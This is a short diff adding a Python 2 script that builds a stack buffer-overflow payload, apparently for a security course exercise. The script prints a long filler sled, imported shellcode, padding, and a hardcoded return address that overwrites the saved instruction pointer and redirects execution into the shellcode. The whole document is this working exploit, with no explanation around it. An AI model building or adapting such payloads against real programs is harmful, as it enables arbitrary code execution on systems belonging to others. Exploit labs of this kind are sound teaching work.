@@ -1,0 +1,3 @@
+from shellcode import shellcode
+from struct import pack
+print '\x10'*1000+shellcode+'A'*37+pack("<I",0xbffea798-0x408)
